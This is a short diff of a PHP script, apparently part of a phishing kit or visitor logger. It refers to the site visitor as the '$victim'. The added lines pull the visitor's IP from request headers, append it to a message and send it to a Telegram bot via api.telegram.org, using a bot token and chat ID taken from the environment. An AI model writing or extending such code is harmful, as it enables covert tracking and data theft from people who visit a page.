@@ -37,12 +37,25 @@ else
     {
       $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipadr = $_SERVER['HTTP_CLIENT_IP'];
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipadr = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+else
+    {
+      $ipadr = $_SERVER['REMOTE_ADDR'];
+    }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT']."\r\n";
 $victim = "IP: ";
 
 
-$message =$message."IP= ".$ipaddress."%0A".$browser."%0A".$useragent."%0A"."%0A";
+$message =$message."IP= ".$ipadr;
 $tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
 $tgchat = getenv('TGCHAT', true) ?: getenv('TGCHAT');
 $url = 'http://api.telegram.org/bot'.$tgbot.'/sendMessage'.'?chat_id='.$tgchat.'&text='.$message;
